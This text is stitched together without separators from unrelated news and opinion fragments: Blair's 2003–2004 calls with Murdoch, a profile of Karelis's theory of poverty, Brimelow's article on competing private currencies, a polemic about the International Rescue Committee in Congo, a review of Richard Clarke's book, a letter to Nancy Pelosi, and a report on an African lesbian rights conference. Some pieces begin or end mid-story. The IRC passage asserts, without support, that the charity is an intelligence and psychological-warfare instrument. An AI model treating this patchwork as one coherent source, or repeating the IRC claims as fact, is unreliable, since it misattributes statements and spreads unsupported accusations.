Check out that story in this issue , and see if you agree with Jeff that it is " the most intelligent conversation on the subject I 've ever witnessed . "
We think you will .
Tony Blair spoke to Rupert Murdoch three times in nine days in the run-up to the invasion of Iraq , it emerged yesterday , after the government caved in to a four - year campaign for the release of details of their conversations and meetings .
The Cabinet Office agreed to publish the dates of their contacts one day after the former prime minister left office .
No further details of the calls are available and no details of informal meetings or conversations have been disclosed .
In all Mr Blair held six formal conversations with the media baron between March 2003 and October 2004 .
The first three took place on March 11 , 13 and 19 ; military action against Iraq began early on March 20 .
A broadcasting row involving the BBC and BSkyB was also taking place .
They spoke again on January 29 2004 - the day after the Sun 's exclusive publication of the Hutton report 's findings - and on April 25 , shortly after Mr Blair agreed to hold a referendum on the EU treaty .
They held a sixth conversation on October 3 , two days after Mr Blair announced he would stand down after his third term .
Liberal Democrat Lord Avebury first requested details of contact between the men in October 2003 , but had no success .
He then filed a formal complaint under the Freedom of Information Act in April 2005 , requesting details of meetings and conversations from September 2002 .
Last July the information commissioner ruled that official contacts could be disclosed .
The Cabinet Office appealed but capitulated 10 months later .
It published the dates yesterday .
A Cabinet Office spokesman said : " We decided it was in the public interest to release it . "
Lord Avebury said : " This is a welcome blow for the cause of freedom of information , but it should n't have taken so much time and effort ...
Rupert Murdoch has exerted his influence behind the scenes on a range of policies on which he is known to have strong views including the regulation of broadcasting and the Iraq war .
" The public can now scrutinise the timing of his contacts with the former prime minister , to see whether they can be linked to events in the outside world .
One hopes that the timing of the government 's decision to capitulate indicates that under Gordon Brown 's leadership freedom of information will be made a reality . "
A spokesman for Mr Blair declined to comment .

In the community of people dedicated to analyzing poverty , one of the sharpest debates is over why some poor people act in ways that ensure their continued indigence .
Compared with the middle class or the wealthy , the poor are disproportionately likely to drop out of school , to have children while in their teens , to abuse drugs , to commit crimes , to not save when extra money comes their way , to not work .
To an economist , this is irrational behavior .
It might make sense for a wealthy person to quit his job , or to eschew education or develop a costly drug habit .
But a poor person , having little money , would seem to have the strongest incentive to subscribe to the Puritan work ethic , since each dollar earned would be worth more to him than to someone higher on the income scale .
Social conservatives have tended to argue that poor people lack the smarts or willpower to make the right choices .
Social liberals have countered by blaming racial prejudice and the crippling conditions of the ghetto for denying the poor any choice in their fate .
Neoconservatives have argued that antipoverty programs themselves are to blame for essentially bribing people to stay poor .
Karelis , a professor at George Washington University , has a simpler but far more radical argument to make : traditional economics just does n't apply to the poor .
When we 're poor , Karelis argues , our economic worldview is shaped by deprivation , and we see the world around us not in terms of goods to be consumed but as problems to be alleviated .
This is where the bee stings come in : A person with one bee sting is highly motivated to get it treated .
But a person with multiple bee stings does not have much incentive to get one sting treated , because the others will still throb .
The more of a painful or undesirable thing one has ( i.e. the poorer one is ) the less likely one is to do anything about any one problem .
Poverty is less a matter of having few goods than having lots of problems .
Poverty and wealth , by this logic , do n't just fall along a continuum the way hot and cold or short and tall do .
They are instead fundamentally different experiences , each working on the human psyche in its own way .
At some point between the two , people stop thinking in terms of goods and start thinking in terms of problems , and that shift has enormous consequences .
Perhaps because economists , by and large , are well - off , he suggests , they 've failed to see the shift at all .
If Karelis is right , antipoverty initiatives championed all along the ideological spectrum are unlikely to work - from work requirements , time - limited benefits , and marriage and drug counseling to overhauling inner-city education and replacing ghettos with commercially vibrant mixed - income neighborhoods .
It also means , Karelis argues , that at one level economists and poverty experts will have to reconsider scarcity , one of the most basic ideas in economics .
" It 's Econ 101 that 's to blame , " Karelis says .
" It 's created this tired , phony debate about what causes poverty . "
In challenging decades of poverty research , Karelis draws on some economic data and some sociological research .
But , more than that , he makes his case as a philosopher , arguing by analogy and induction .
This approach means that he remains relatively unknown , even among poverty researchers .
The book in which he laid out his argument , " The Persistence of Poverty : Why the Economics of the Well - Off Can't Help the Poor , " was n't widely read when it was published last year .
A few , though , have taken notice , and are arguing that Karelis does have something important to say .
" There 's not much evidence in the book , and there are a lot of bold claims , but it 's great that he 's making them , " says Tyler Cowen , an economics professor at George Mason University .
It " was a really great book , and it was totally neglected . "
The economist 's term for the idea Karelis takes issue with is the law of diminishing marginal utility .
In brief , it means the more we have of something , the less any additional unit of that thing means to us .
It undergirds , among other things , how the US government taxes people .
We assume that taking $ 40,000 in taxes from Warren Buffett will be a lot less onerous to him than to an elementary school teacher , because he has so much more to begin with .
In many cases , Karelis says , diminishing marginal utility certainly does apply :
Our seventh ice cream cone will no doubt be less pleasurable than our first .
But the logic flips when we are dealing with privation rather than plenty .
To understand why , he argues , we need only think about how we all deal with certain familiar situations .
If , for example , our car has several dents on it , and then we get one more , we 're far less likely to get that one fixed than if the car was pristine before .
If we have a sink full of dishes , the prospect of washing a few of them is much more daunting than if there are only a few in the sink to begin with .
Karelis 's name for goods that reduce or salve these sort of burdens is " relievers . "
Karelis argues that being poor is defined by having to deal with a multitude of problems :
One does n't have enough money to pay rent or car insurance or credit card bills or day care or sometimes even food .
Even if one works hard enough to pay off half of those costs , some fairly imposing ones still remain , which creates a large disincentive to bestir oneself to work at all .
" The core of the problem has not been self - discipline or a lack of opportunity , " Karelis says .
" My argument is that the cause of poverty has been poverty . "
The upshot of this for policy makers , Karelis believes , is that they do n't need to fret so much about the fragility of the work ethic among the poor .
In recent decades , experts and policy makers all along the ideological spectrum have worried that the more aid the government gives the poor , the less likely they are to work to provide for themselves .
David Ellwood , an economist and the dean of Harvard 's John F. Kennedy School of Government , has called this " the helping conundrum . "
It was this concern that drove the Clinton administration 's welfare reform efforts .
But , according to Karelis , that argument is exactly backward .
Reducing the number of economic hardships that the poor have to deal with actually make them more , not less , likely to work , just as repairing most of the dents on a car makes the owner more likely to fix the last couple on his own .
Simply giving the poor money with no strings attached , rather than using it , as federal and state governments do now , to try to encourage specific behaviors - food stamps to make sure money does n't get spent on drugs or non-necessities , education grants to encourage schooling , time limits on benefits to encourage recipients to look for work - would be just as effective , and with far less bureaucracy .
( One federal measure Karelis particularly likes is the Earned Income Tax Credit , which , by subsidizing work , helps strengthen the " reliever " effect he identifies . )
Few economists are familiar with Karelis 's work , and when it 's presented to them , they tend to be skeptical of its explanatory power .
If Karelis is right , we should see even more defeatist behavior than we do from the poor , says Kevin Lang , chairman of the Boston University economics department and author of " Poverty and Discrimination . "
Plus , he argues , there 's little evidence that simply making poor people less poor increases their work ethic - and some evidence that it does the opposite .
In the early 1970s , a large - scale study gave poor people in four cities a so - called " negative income tax , " a no-strings - attached payment based on how little money they made .
The conclusion : the aid tended to discourage work .
Karelis responds that the data from that experiment is in fact quite ambiguous , and there has been debate among economists over how to interpret the results .
But ultimately , he believes , the strength of his arguments is less in how they fit with the economic work that 's been done to date on poverty - much of which he is suspicious of anyway - but in how familiar they feel to all of us , rich or poor .
" The bee sting argument , or the car dent one , " he says , " I 've never had anybody say that that is n't true . "

OK , I admit it : I tend to be early .
The idea of private money — often referred to as " competing currencies " — has always fascinated me .
I persuaded Jim Michaels , the late , great editor of Forbes Magazine , to let me translate the little - known academic literature into journalese in this article , which he published under the title Do You Want To Be Paid In Rockefellers ?
In Wristons ?
Or How About A Hayek ?
almost ( ahem ! ) exactly twenty years ago .
( May 30 , 1988 ) .
The Great Inflation of the 1970s was then still a live memory .
For some years , my account was regularly assigned in college courses .
Now , GOP Presidential candidate Ron Paul seems to have single - handedly revived the issue with his relentless criticisms of the Federal Reserve .
( Click here for Google web search ) .
I still think it 's going to happen — just as there will eventually be an immigration cut - off .
The Federal Reserve System will be 75 years old in December .
A small but growing band of academic economists proposes a special sort of birthday celebration :
The Fed , they say , should be abolished .
Abolished ?
The sole bulwark we have against runaway inflation and fiscal irresponsibility ?
Most people can’t imagine life without a currency - issuing central bank , although in fact the Fed is younger than one of its most relentless critics , Nobel laureate Milton Friedman , still going strong at 76 [ R. I. P. 19122006 ] and hard at work at California ’s Hoover Institution .
The Fed allegedly manages the country ’s money supply in order to prevent such economic disturbances as inflation , deflation and depression .
But it is a matter of record that , since the Fed arrived , economic disturbances have been more severe than previously — notably the Great Depression of 1929 and the Great Inflation of the Seventies .
In the process , the purchasing power of the dollar has almost completely eroded .
Even now , inflation is still gnawing away at around 4 % a year , compared with a mere 3.3 % when President Richard Nixon first imposed wage and price controls in 1971 .
Central banking distresses some .
They argue that , far from preventing these disturbances , central banking may exacerbate them .
The Fed has been accused of being too tight in the 1930s and too loose in the 1970s and of innumerable lesser errors .
After bitter debate , most economists have come to accept at least a part of this critique .
For years , Milton Friedman has advocated doing away with some of the Fed ’s flexibility by forcing it to expand the money supply only at a fixed annual rate approximating the long - run growth of the economy .
The Fed ’s new critics , however , go further .
They think the government should be out of the money business altogether .
They argue that money could and should be provided competitively by the private sector — just like baked beans , business magazines or any other goods .
What ?
Money is money , is n’t it ?
How can you have different kinds of money in the same economy ?
The idea of Citibank and Chase Manhattan issuing their own money may indeed seem mind - boggling .
What would their currencies be called — Wristons and Rockefellers ?
But the truth is that there have been several episodes of private , competing monies in world economic history , including in the U.S. Recent research is suggesting they worked much better than had been thought .
Meanwhile , financial deregulations at home and floating exchanges rates abroad are creating an environment in which elements of a competitive system are already emerging — without the permission of professors or politicians .
In his forthcoming book , Free Banking and Monetary Reform , former Manhattan Institute economist David Glasner calls this phenomenon “ the competitive breakthrough ” that might eventually lead to the complete privatization of money .
Government money monopolies were effectively universal by the early 20th century .
Even free market economists , with few exceptions , took them for granted .
But these monopolies became much easier to question after Friedrich A. Hayek , who received the Nobel Prize for Economics in 1974 , published his Denationalization of Money in 1976 and expanded upon it in 1978 .
Hayek announced that , on reflection , he no longer thought government money monopolies were either necessary or desirable , given their record of inflation .
Instead , private institutions such as banks should be allowed to issue their own monies , denominated as they wished .
Conventional wisdom had assumed that a profit - seeking bank would immediately print too much money .
But Hayek pointed out that this course would be self - defeating .
If a bank over - issued its currency , causing it to depreciate , people would n’t want to accept or hold it , preferring that of more conservative banks .
The offending bank ’s currency would go to a discount and , in short order , the bank would have to curb its enthusiasm .
Competition , Hayek said , would do a better job of compelling private institutions to maintain their money ’s value than politics had with public institutions like the Fed .
Maybe — but let ’s be practical .
How would I buy my groceries ?
Suppose the prices were marked in Rockefellers and all I had were Wristons ?
Suppose I ’m a New Yorker in San Francisco ?
San Franciscans might prefer BankAmericas .
What good would my Wristons be ?
How could a merchant function if his customers kept coming in with different kinds of currencies ?
How could a businessman keep his books ?
The answer to these interesting questions depends partly on which of the several different proposals for privatizing money is under discussion .
Hayek ’s version is particularly radical .
In most historical episodes of private money , banks issued their own notes but denominated them in the national unit of account — the dollar , the pound .
These notes usually exchanged at par and would be discounted only as a last resort in specific circumstances , such as overissue .
But more generally it is clear from the response of merchants in border zones like Tijuana or Toronto , and from inflation - racked countries like Israel or Argentina that are evolving a de facto U.S. dollar standard , the costs of handling parallel currencies can easily be exceeded by the benefits .
Computers and hand - held calculators reduce the confusion , just as they have helped business to handle international floating exchange rates .
The fact is that free markets do n’t produce chaos .
Efficiency will probably dictate that just a few kinds of monies , perhaps only one , will become universally accepted — exactly as the international computer industry has spontaneously evolved standard operating systems .
To understand Hayek ’s proposal and the whole competing currencies concept , you have to think about the nature of money .
Most laymen , and some economists , assume that money is a collective convenience requiring government to organize , like national defense .
But the historical evidence seems to be that in reality money developed all by itself .
Merchants just agreed upon common stores of value and mediums of exchange because they found using them more efficient than barter — an example of what Hayek calls “ spontaneous order . ”
Coins are traditionally supposed to have been invented in the 7th century B.C. by the Lydians , whose King Croesus became a legend for his wealth .
But significantly , David Glasner reports , the earliest surviving coins appear to have been privately issued .
The Lydian royal minting monopoly was only later imposed — by another king for whom the Greeks invented the word “ tyrant . ”
Recent observations have tended to confirm the private origins of money .
In one famous case , cigarettes spontaneously evolved as the medium of exchange in a World War II prisoner of war camp .
In much of Europe after WWII , U.S. nylon stockings were a kind of sexual currency .
Whether or not governments were needed in the money business , however , they undeniably found getting into it an irresistible source of revenue and power , particularly in time of war or national emergency .
Minting coins was easy and profitable .
Most convenient of all for a spendthrift king , the coins could be debased — reissued with the same face value but a lesser amount of precious metal — or actually clipped of some of their gold and recirculated .
Later , when money developed into a claim on some other asset rather than being intrinsically valuable in itself , governments discovered that they could simply overissue it .
Of course , all this would eventually result in too much money chasing too few goods and rising prices — a process still going on merrily today .
But that ’s in the long run .
And in the meantime , monkeying about with money produced interesting spasms in the economy that could be very useful politically — for example , to influence elections .
Market forces can be damned but not destroyed .
By the Middle Ages , even governments that monopolized money found themselves confronted with a burgeoning banking industry that was being summoned into existence by the growth of trade .
Banks not only accepted deposits of money from customers , on which they paid interest , but also made loans to other customers , on which they charged interest .
A loan was made by a bookkeeping entry that created a deposit upon which this new debtor could draw .
These new banks were able to incur multiple liabilities against the same hard cash , because bank IOUs were exchanged among the public in settlement of their own affairs and rarely presented for payment .
In effect , the banks were creating money .
Governments tolerated this development largely because they needed to borrow money themselves , badly .
For example , the Bank of England , the ancestor of all central banks , was first granted its charter in 1694 because it promised to buy William III ’s government bonds and finance his wars when Parliament would not .
Similarly in the U.S. , the 1863 National Bank Act compelled qualifying banks to hold specified amounts of federal debt , helping to pay for the Civil War .
So even a government ’s monopoly over the issuance of currency gives it only indirect control over the entire money supply .
In recent years in the U.S. this control has been exerted by a straitjacket of banking regulation — much of it dating from the New Deal and subsequently rotted away by inflation , and by the Fed ’s ability to alter the reserves that banks are required to maintain with it , thus affecting the size of the base upon which they can build their pyramids of credit .
But now “ financial innovation ” is producing a proliferation of irritatingly hard - to - categorize “ near monies ” — for example , traveler ’s checks , some of whose issuers are bound not by reserve regulations but only by their own self - interested prudence .
Thus , in a sense , American Express is already issuing its own private money , although denominated in and convertible into Fed - produced dollars .
Hayek ’s proposal is particularly radical because it combines a number of distinct ideas that are already quite radical enough :
“ Free banking ” — banks ought to be able to issue currency and create deposits ( conceptually the same thing ) , choose their own reserve ratios and generally operate entirely without regulation .
— banks ought to be able to issue currency and create deposits ( conceptually the same thing ) , choose their own reserve ratios and generally operate entirely without regulation .
Different denominations — privately issued currencies need not be all denominated in the same unit : Citibank ’s Wristons and Chase Manhattan ’s Rockefellers would be traded against each other in a currency market just as the different national currencies are today .
Private fiat money — these private currencies need not necessarily be convertible into gold or any underlying commodity , but would trade entirely on the word of the issuing bank that it would not debauch its money .
Would n’t this create chaos ?
Is Hayek serious ?
Idea number one , free banking , is very serious .
New York University ’s Lawrence H. White has recently attracted much attention with his book Free Banking in Britain , a documentation and formal analysis of the system ’s smooth working over a 128 - year period in Scotland .
Scottish free banking was suppressed in 1844 , not because it did n’t work , but in the course of legislation aimed at difficulties in the very different English banking system .
But did n’t this cause chaos in the U.S. ?
What about the wildcat banks ?
That bit of history is far from settled .
Free banking briefly flourished under state charters in the U.S. from 1837 to the Civil War .
“ Wildcat banks ” were accused of locating out in the frontier forests , with the wildcats , so that their notes could not easily be presented for redemption .
But recent studies suggest that these problems have been much exaggerated .
And most of them , it is argued , were caused by interfering state governments and inadequate enforcement of laws against fraud .
In both Scotland and the U.S. the private money thus issued was denominated in the national monetary unit and was theoretically interchangeable and redeemable into gold .
In the U.S. , unlike in Scotland , national branch banking was not allowed , so notes issued by unknown faraway banks , as well as those that were suspect for other reasons , sometimes traded at a discount .
This was not , however , an impossible inconvenience : Bill brokers sprang up to act as middlemen .
It would be even less of a problem in these days of instant communications — and , above all , if nationwide branch banking were allowed .
Still , the wildcat banks left their clawmarks on the U.S. economics profession .
Many economists concluded that private banks had a theoretical incentive to behave badly :
They would produce money until its value had been driven down to its cost of production , which is essentially zero .
This would cause a price explosion — severe inflation .
David Glasner , however , rebuts this argument by pointing out that a bank can make profits only to the extent that the public will hold its money .
Otherwise it will be driven into insolvency by adverse clearings with its competitors as the public converts out of its money and into their money .
If people trust Wristons more than Rockefellers , Chase would have to either mend its ways or be driven out of business , and vice versa .
Thus , for a bank like Chase Manhattan , the key question would be not the cost of physically creating Rockefellers but of keeping them in circulation .
Chase ’s “ cost of production ” would be the resources it expended in maintaining sufficient balances of whatever was necessary in order to convince its customers that their Rockefellers could be redeemed whenever they wanted .
But does n’t bad money drive out good ?
Everyone has heard of Gresham ’s law , but practically no one understands it .
Queen Elizabeth
I ’s financial adviser was talking about a situation where two monies exchange at a rate fixed by law — for example , if both are legal tender and must be accepted in discharge of debt .
Under these circumstances , people will try to pass on the “ bad ” money — the money whose value is suspect , either because of debasement or overissue — and hoard the money that ’s “ good . "
But if the rate of exchange between the monies is free to fluctuate , it is the debauched currency that will depreciate and be driven out .
Well , who would be the lender of last resort — as the Fed can be after disasters such as Oct. 19 last year or the 1970 Penn Central bankruptcy ?
Nobody .
A free banking system , its advocates insist , pointing to Scotland , is not inherently unstable .
The celebrated 19th - century banking “ panics ” were relatively brief and self - correcting compared with the Great Depression , with the sound banks leading reserves to rescue unsound ones out of their own interest in preventing general collapse , as J.P. Morgan did in the panic of 1907 .
In Scotland , banks competed for the customers of failed banks by accepting their notes at par .
In fact , private money proponents think the Fed ’s activities as a lender of last resort , and the New Deal ’s deposit insurance programs , have actually made the U.S. banking system ’s problems worse .
They have encouraged bankers to take risks , knowing that the feds would bail them out , and thus in effect subsidized imprudent banking .
Ask anyone in Texas .
The advocates of private monies are still arguing among themselves about other aspects of the scheme , including Hayek ’s idea number two ( different denominations ) and idea number three ( private fiat money ) .
Lawrence H. White , for example , thinks that , as in Scotland , all monies should be denominated in the same unit , albeit visually distinguishable so that they could trade at a discount if necessary .
And he predicts that the emerging successful money would probably turn out to be one offering convertibility into gold or silver .
But these disputes are not conducted with the usual academic acerbity .
This is because all private - money advocates agree that such questions can really be settled only by allowing competition to begin .
Then the free market , to employ a key Hayekian concept , will search out the best solution .
The privatization of money has important macroeconomic implications .
It offers , according to its advocates , a way out of the current grand impasse of monetary policy .
For most of its existence , the Fed has focused on interest rates , the price of credit , assuming that the amount of money it was supplying to the economy was less important .
But interest rates are affected by many factors , and the Fed often ended up supplying so much money that the resulting inflation could not be ignored .
But by the time the Fed finally admitted to the importance of the money supply , in the early 1980s , it turned out that the demand for money — its “ velocity of circulation ” — was jumping about unpredictably , too .
Thus , judged by the usual measures , the Fed supplied massive quantities of money to the economy after 1982 .
But , contrary to what Friedman and like - minded monetarists predicted , it did not boil off into inflation .
The velocity simply slowed .
So now the Fed appears to be flying blind , following neither a price rule nor a quantity rule , responding to ad hoc considerations such as the beliefs of the Fed chairman or whatever exchange rate influential politicians happen to feel would be convenient for the dollar .
Monetary policy would not be a problem if banks issued their own monies ; it would cease to exist .
Banks would automatically extend credit to the extent that they and their customers agree it is economically productive .
If business conditions deteriorated , loans would be liquidated , liabilities written down to match , and the banks ’ balance sheets would shrink .
Thus the quantity of money demanded by the economy would be automatically supplied by the market , just as it now supplies the appropriate number of automobiles .
( Imagine the mess if an outfit like the Fed were to control auto production , based on its best guesses of what demand ought to be . )
Occasionally , of course , banks and customers would make mistakes .
But this should be no more disruptive than a mistake in any other business .
Auto factories do overproduce .
So do builders of office buildings .
But the economy adjusts .
A much - loved answer to the mystery of monetary policy is to link the dollar in some way to gold .
But gold standard advocates have always had a problem with gold ’s moderate but real fluctuations in price , which would inflict involuntary deflations and inflations upon the economy .
Competing currencies would tend to solve this problem .
Joe Cobb , senior economist for the U.S. Congress ’ Joint Economic committee , believes that a private money convertible into gold would eventually become dominant .
“ But with free banking , other types of money would come in at the margin if there were too little or too much gold - backed money , ” Cobb says .
Silver - backed , maybe , or oil - backed .
These monies would either supplement the gold - backed currency ( if the gold price had risen , causing deflation ) or displace it ( if the gold price had fallen , causing inflation ) .
Recently , the young economists in the private - money subculture have been electrified by hints that the leader of the monetarist school , Milton Friedman himself , is being converted .
In 1986 Friedman coauthored a paper significantly softening his view that governments necessarily have a role in money .
Even more significantly , he has abandoned his long - held position that the Fed should aim for a fixed rate of growth in the monetary aggregates .
Now he argues that the monetary base —
Fed deposits plus currency — should be frozen and complete free banking be allowed to pyramid upon this reserve base .
This looks like a revised monetary rule , but in fact it is n’t .
Under Friedman ’s new proposal the free market , rather than the Fed , would dictate the size of the money supply - based on the banks ’ feel for the legitimate demand for money .
Friedman stoutly denies that his new proposal has anything to do with the volatile velocities of the 1980s , which he blames on Fed policy .
Instead , he says he is now convinced that central bankers will never accept moderate restraint , so he proposes to eliminate their power .
However , he agrees that under free banking the troublesome issue of velocity would be neatly bypassed .
The proponents of private money take Friedman ’s shift as confirmation that their position is just the logical extension of market principles .
“ Once the question is put , there ’s only one answer , ” says the University of Sheffield ’s Kevin Dowd , whose book The State and the Monetary System is being published by the Vancouver - based Fraser Institute .
Milton Friedman has an estimate of the chances of money being denationalized : “ Zero . ”
But then , he recalls , for years economists were derided for arguing about the feasibility of floating exchange rates .
Then suddenly the idea became reality .
So , maybe the chances are better than zero .
The first victory of the competing currency school may well be negative .
By stressing the fundamental flaws of central banking , they may help derail the diametrically opposed proposal : to develop one world currency centrally managed by the International Monetary Fund .
This idea was the subject of a recent cover story in the Economist magazine , and a version of it has recently been advocated by Harvard economist and former Carter Administration official Richard Cooper .
The single - currency proposal appalls the private - money people , since it would mean an immensely powerful world central bank , able to manipulate its money without the minimal discipline existing now because investors can flee into other currencies .
The single - currency proposal , says Lawrence H. White , would be “ suicide after prolonged self - torture . ”
It ’s even possible that competing currencies may come into existence on their own .
Richard W. Rahn , chief economist of the U.S. Chamber of Commerce , has actually sketched out a proposal to launch a private currency convertible into commodities or government currencies under prevailing laws .
He suggests using commodity futures markets to lower operating costs , and overseas tax havens to avoid the tax problems preventing wider use of the 1977 “ gold clause ” legislation that made contracts based on gold legally enforceable .
“ Private money is not just an abstract idea , but an idea whose time has come , ” Rahn says .
“ It ’s technologically and legally feasible . ”
Meanwhile , a small network of economists attracted by competing currencies is quietly establishing itself .
Books and articles are being published , sympathizers located ( including outposts in Britain , France and Germany ) and eminent authorities intrigued .
“ It ’s an intellectually very respectable idea , ” says Sir Alan Walters of Johns Hopkins University , a leading monetarist and formerly economic adviser to Prime Minister Margaret Thatcher .
“ I think free banking could work quite well . ”
But seriously : Can a handful of thinkers change the world ?
Strange things happen in the idea business .
When Adam Smith ( who did not regard money as necessarily a government function ) wrote The Wealth of Nations in 1776 , he commented that to expect free trade to be established in Britain was “ as absurd as to expect that an Oceana or Utopia should be established in it . ”
But his ideas prevailed in spite of the odds against them , and some 90 years later not one British tariff was left .

The Best of Peter Brimelow
Behind the Numbers Redux :
How Truth is Hidden , Even When it Seems to Be Told
T he International Rescue Committee in late January 2008 released a new report on the mortality in the war - torn Democratic Republic of Congo .
The report caught the eye of some news agencies , who quickly whipped up trite little articles as supposed expressions of horror .
Over and over it has been declared " the world 's forgotten crises . "
There are reasons why Darfur is in the crises of the day , the poster crises , and why Congo is hardly mentioned . [ 1 ]
However , the story of war and plunder in Congo is not unreported .
It is a story that has been censored , manipulated , and covered up even while it is ostensibly being told .
Plenty of information has been published about the war in the Democratic Republic of Congo , and plenty of this is flak , designed to whiteout the truth , and help keep the real story buried , and that includes the truly honest representations of war and suffering in Congo that have been published .
Just because the mainstream does n't cover it , does n't mean it did n't happen .
This is the falsification of consciousness .
While the true death toll in Congo over the past series of wars - for the Congolese it is one long contiguous war - will never be known , it is far higher than the IRC figures .
In the IRC 's tidy statistical equations there is no recounting the ordeal of the millions of people who have disappeared into the swamps , the tropical forests , the mass graves , torture chambers and death camps , or after crossing borders .
The entire exercise in counting the dead is another way to do little to stop it .
The IRC is about profits , but that is not all .
The International Rescue Committee has been described in the past as the ideal instrument of psychological warfare , and it is .
This is exactly what is going on with the IRC today , and more , when the IRC - heavily subsidized by the very same profiteers - sends its body counters into Congo .
But the IRC is not only the ideal instrument of psychological warfare , it is also the ideal instrument of intelligence gathering .
The IRC capitalizes on their access to refugee populations , conflict areas and individual refugee encounters and interviews to gather intelligence on armed groups , leadership , resources , weapons and geographical conflicts , information that is selectively used to serve the greater interests of the IRC and its partners .
America 's Secret Warriors
Amongst the trustees or overseers of the International Rescue Committee is Henry Kissinger , a man whose interests run very deep in Congo .
Henry Kissinger is tied to Freeport McMoRan ( FXC ) and FCX is all over the copper and cobalt show in Katanga .
FCX director J. Stapleton Roy was Assistant Secretary of State for Intelligence and Research under Madeleine Albright , 1999 - 2000 , during the Clinton administration invasions of Rwanda ( 1994 ) and then Congo / Zaire ( 1996 ) ; Roy retired to join Kissinger Associates .

As the President 's neglected terrorism adviser , it was Clarke 's moment .
He had badgered the Bush Administration for almost a year to take al - Qaeda seriously .
Rice , he claimed , had not even heard of al - Qaeda when she joined the White House .
Now , his dire predictions coming true , the National Security Adviser had asked Clarke to run the crisis cabinet meeting responding to the attacks .
As Clarke peppered senior officials with demands , from scrambling fighters , to closing America 's borders , his phone line to the White House bunker kept dropping out .
The scene in the bunker was almost farcical .
The Vice - President 's wife , Lynne , had turned down the volume on Clarke 's video - conference so she could hear CNN .
Mrs Cheney , who Clarke describes as a right - wing ideologue " like her husband " , was offering advice and opinions while the Vice - President talked with President Bush , who had just left a primary school in Florida .
Told of the attacks in New York , Bush had spent seven minutes listening to a story about a pet goat .
Two hijacked aircraft were flying towards Washington .
Cheney kept hanging up his line to Clarke .
With a Tom Clancy - like pace and the insider 's perspective of a four - time presidential adviser , Against All Enemies : Inside America 's War on Terror is a scathing critique of the Bush Administration .
A Republican voter and lifelong public servant , Clarke argues the Bush Administration ignored his warnings that al - Qaeda was an imminent threat .
After September 11 it immediately looked for excuses to invade Iraq , he says , even though it was clear Saddam Hussein had nothing to do with it .
From his vantage of a White House adviser , Clarke charts Islamic terrorism towards the US from the end of the Cold War to Iraq .
Against All Enemies does not pretend to be a comprehensive account but offers a series of behind - the - scenes accounts of presidents wrestling with adversaries they can't find and do n't understand .
It also contains the first close - up comparison of the Clinton and Bush presidencies and is laced with personal anecdotes loved by political fans .
George Bush is not dumb or lazy , Clarke says , but relies on a small group of advisers and looks for simple solutions , known in the US as the " bumper sticker " response .
President Bill Clinton would examine problems from every angle .
And when he had exhausted the White House 's expertise , he would look elsewhere .
Bush and his inner circle are unconcerned by nuance .
They already know the answers , Clarke says .
The night after September 11 Clarke found the President wandering around the White House Situation Room looking like he wanted something to do .
He pulled Clarke and several officials aside and ordered them to investigate any links with Saddam .
Clarke , who had been unsuccessfully trying to brief the President all year on al - Qaeda , was cut off when he tried to explain that Osama bin Laden was responsible .
When the intelligence agencies later unanimously backed him up , Clarke says he got a clear response from the President 's deputy national security adviser : " Wrong answer . "
Clarke prides himself on his objectivity - he headed off attempts in the Clinton Administration to intervene in the Rwandan genocide because he did not believe US interests were at stake .
After 30 years in government he retired last year , believing the Administration 's decision to invade Iraq was the best thing it could do to boost al - Qaeda recruiting .
He set about writing this book , which essentially argues that the Bush Administration has botched the war on terrorism .
When Against All Enemies was published in the US last month the White House launched a full media attack on his motivation , integrity and character .
He was a disgruntled job seeker and a political opportunist who failed to prevent several terrorist attacks on US targets , it said .
Rumours about his personal life were spread to journalists .
Clarke expected the criticism and responded with a public relations skill apparently absorbed through many years of White House experience .
Under oath , he vowed not to accept a position in a future Democratic Administration , pledged to donate some of the book 's profits to widows and orphans of the Iraqi and Afghanistan wars and brandished a hand - written note from the President praising his service .
The attacks soon died out .
He now co-teaches a subject at the Kennedy School of Government at Harvard University .
In a recent class he posed the question : how should the US respond to a terrorist attack on a US military base by Iran and react to the inevitable counter - move .
The class eventually had the US invading Tehran with five divisions .
Clarke did not offer an answer , having neatly illustrated his point .
Policy - makers need to think five steps ahead , not one .
Aaron Patrick is a masters student at Harvard University and a former New York correspondent for The Australian Financial Review .
Madame Speaker : Speaker Pelosi , your continued leadership of the Democratic Party through this challenging primary season is very much appreciated .
Thank you for standing up for the right of the people to choose the nominee and stating that superdelegates should respect the will of the voters .
Today , March 26 , 2008 , a group of Senator Hillary Clinton 's top donors and fundraisers admonished you for standing up for democracy and , in a veiled threat , implied that they might sever their support of the DCCC should their request not be fulfilled .
The signatories of this letter suggest that their wealth and power can alter the course of this nomination process .
A record - breaking number of voters and caucus - goers representing all demographics have rejected this top - down type of politics that has plagued our politics and government for far too long .
Senator Barack Obama's " bottom - up " grassroots efforts have offered us an alternative to the very type of politics that the aforementioned letter suggests : that the wealth of a chosen few influence the outcome of the primary election .
Yet the Obama campaign has shown again and again that the hope of the many has changed the dynamic of wealth - driven politics .
Supporters of Senator Obama 's campaign have shattered records for donations to a presidential primary -- we give not just with our wallets but also with our time , energy , hands , feet , and phone - banking and canvassing skills .
The activism we have seen evolve from Senator Obama 's campaign has engaged millions of Democratic , Independent , and Republican voters .
If superdelegates overturn the will of the people , the Democratic Party , and possibly our country , might never recover .
Speaker Pelosi , we respectfully ask for your continued encouragement of superdelegates to support the nominee who has won the most pledged delegates and leads in popular votes .
Honoring the will of the people who have exercised their right to vote is the ultimate display of democracy .

Homosexuality remains taboo across much of Africa
The demand came as about 75 activists gathered at a conference in Maputo , the capital of Mozambique .
The Coalition of African Lesbians called the conference to highlight discrimination across the continent .
Conference spokeswoman Fikile Vilakazi told the BBC that action was needed to respond to homophobia which , she said , was rife in Africa .
South Africa holds the most liberal attitude towards homosexuality on the continent
She said her main goal was to stop governments treating homosexuality as a criminal offence .
According to the International Gay and Lesbian Association , homosexuality is outlawed in 38 African countries .
One participant said the conference was helping to provide support for lesbians across Africa .
HOMOSEXUALITY IN AFRICA
Homosexuality is outlawed in 38 African nations , and legal ( or unmentioned in the statute book ) in at least 13 In Mauritania , Sudan and northern Nigerian states , homosexuality may be punished by death
In Uganda , offenders may receive life imprisonment , and in countries including Gambia , Kenya , and Tanzania , homosexuality is punishable by up to 14 years in jail South Africa is the only country in the world which guarantees gay and lesbian rights in the constitution - but discrimination remains in practice
In Zimbabwe , even same - sex displays of affection may be a criminal offence Sources : IGLA and Behind the Mask
" We might be seemingly a bit lost right now on the African continent , but there 's positive talk , " said the delegate .
" As Christians we realise that the Bible does n't discriminate , it embraces us in our diversity . "
Another participant , Nahlahla Mukize , said being a lesbian in Africa was a negative experience .
